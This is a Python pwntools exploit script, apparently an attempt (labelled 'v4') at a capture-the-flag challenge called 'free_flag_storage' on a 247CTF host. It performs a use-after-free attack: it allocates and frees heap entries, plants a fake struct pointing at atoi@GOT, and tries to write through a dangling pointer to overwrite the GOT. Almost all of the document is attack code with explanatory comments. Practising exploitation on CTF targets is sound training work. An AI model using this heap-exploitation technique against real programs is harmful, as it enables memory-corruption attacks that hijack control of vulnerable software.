#!/usr/bin/env python3
"""
UAF Exploit v4 - Trying to access dangling pointer via edit()

Theory:
- show() respects count, won't show dangling flags
- But edit() might not check bounds properly!
- If edit(1) works, we can:
  1. Read/write through the dangling pointer
  2. Since flags[1]->struct1 = our controlled fake struct
  3. edit(1) writes to fake_struct.value_ptr = puts@GOT
  4. GOT overwrite achieved!
"""
from pwn import *

context.binary = elf = ELF('./free_flag_storage')
context.log_level = 'info'

puts_got = 0x804b028
atoi_got = 0x804b034

def start():
    if args.REMOTE:
        return remote('de22d451a7a11cba.247ctf.com', 50413)
    return process('./free_flag_storage')

p = start()

def send3(s):
    p.send(str(s).encode().ljust(3, b'\n'))

def add(length, value, cid, score):
    p.sendline(b'add')
    p.recvuntil(b'length:'); send3(length)
    p.recvuntil(b'value:'); p.send(value.ljust(length, b'\x00')[:length])
    p.recvuntil(b'challenge_id:'); send3(cid)
    p.recvuntil(b'score:'); send3(score)
    p.recvuntil(b'Enter command:')

def edit(idx, value, length, cid=99, score=99):
    """Returns True if edit succeeded, False if rejected"""
    p.sendline(b'edit')
    p.recvuntil(b'edit:')
    send3(idx)
    resp = p.recvuntil([b'):', b'Enter command:'])
    if b'Enter command:' in resp:
        log.warning(f"edit({idx}) was rejected")
        return False
    p.send(value.ljust(length, b'\x00')[:length])
    p.recvuntil(b'challenge_id:'); send3(cid)
    p.recvuntil(b'score:'); send3(score)
    p.recvuntil(b'Enter command:')
    return True

def delete(idx):
    p.sendline(b'delete')
    p.recvuntil(b'delete:'); send3(idx)
    p.recvuntil(b'Enter command:')

def show():
    p.sendline(b'print')
    return p.recvuntil(b'Enter command:', drop=True)

p.recvuntil(b'Enter command:')

log.info("Step 1: Create flag0(8b), flag1(8b)")
add(8, b'AAAAAAAA', 1, 11)
add(8, b'BBBBBBBB', 2, 22)

log.info("Step 2: Delete flag1, then flag0")
delete(1)
delete(0)

log.info("Step 3: Add flag2 with 16-byte value containing fake struct")
# Fake struct: length=16, value_ptr=atoi@GOT, cid, score
fake_struct = p32(16) + p32(atoi_got) + p32(0x1111) + p32(0x2222)
add(16, fake_struct, 3, 33)

log.info("Step 4: Test if edit(1) accesses the dangling pointer")
log.info("  flags[1] -> struct1 = flag2's value = our fake struct")
log.info("  fake_struct.value_ptr = atoi@GOT")
log.info("  So edit(1) should write to atoi@GOT!")

# First try to edit index 1
if edit(1, b'XXXX', 16):
    log.success("edit(1) worked! Wrote to atoi@GOT (probably crashed or weird behavior)")
else:
    log.info("edit(1) rejected, trying different approach")

# What about edit(0)?
log.info("Trying edit(0) to see what happens")
# edit(0) would access flags[0] -> struct0 = flag2's struct
# which has value_ptr pointing to struct1 (flag2's value buffer)
# So edit(0) writes to struct1 = our fake struct
# This overwrites our fake struct, but doesn't give us arbitrary write

p.interactive()
